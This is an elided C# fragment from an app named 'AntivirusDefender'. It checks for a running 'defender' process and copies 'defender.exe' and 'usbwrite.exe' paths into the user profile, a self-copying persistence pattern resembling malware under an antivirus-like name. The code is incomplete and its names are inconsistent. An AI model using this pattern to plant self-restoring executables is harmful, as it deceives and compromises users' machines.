...
namespace AntivirusDefender
{
    public partial class Form1 : Form
    {
        ...
        {
            string antivirusPath = Path.Combine(Application.StartupPath, "usbwrite.exe");
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "usbwrite.exe");
            ...
            string antiAttackPath = Path.Combine(Application.StartupPath, "usbwrite.exe");
            ...
            bool antivirusDefenderRunning = Process.GetProcessesByName("defender").Length > 0;
            ...
            {
                string antivirusDefenderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "defender.exe");
                ...
                if (!File.Exists(antivirusDefenderPath))
                {
                    try
                    {
                        ...
                        File.Copy("defender.exe", antivirusDefenderPath);
                    }
                    catch (Exception ex)
                    {
                        // Handle the exception
        ...
        {
            string antivirusPath = Path.Combine(Application.StartupPath, "defender");  
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "defender.exe");
